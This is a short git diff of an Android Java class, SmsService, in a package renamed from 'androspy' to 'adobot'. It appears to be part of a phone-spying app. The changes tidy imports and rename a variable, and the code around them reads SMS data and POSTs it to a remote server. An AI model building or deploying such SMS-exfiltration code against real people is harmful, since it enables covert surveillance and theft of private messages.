@@ -1,17 +1,12 @@
-package buddy.ap.com.androspy;
+package buddy.ap.com.adobot;
 
 import android.content.ContentResolver;
-import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.AsyncTask;
-import android.preference.PreferenceManager;
-import android.provider.ContactsContract;
 import android.util.Log;
 
 import org.json.JSONObject;
 
-import java.io.UnsupportedEncodingException;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
@@ -86,13 +81,11 @@ public class SmsService extends Thread implements Runnable {
                     JSONObject obj = new JSONObject(p);
                     Log.i(TAG, obj.toString());
 
-                    Http notifyStart = new Http();
-                    notifyStart.setMethod("POST");
-                    notifyStart.setUrl(client.SERVER + POSTURL);
-                    notifyStart.setParams(p);
-                    notifyStart.execute();
-
-//                    client.getSocket().emit("message:push", obj);
+                    Http smsHttp = new Http();
+                    smsHttp.setMethod("POST");
+                    smsHttp.setUrl(client.SERVER + POSTURL);
+                    smsHttp.setParams(p);
+                    smsHttp.execute();
 
                 } catch (Exception e) {
                     e.printStackTrace();
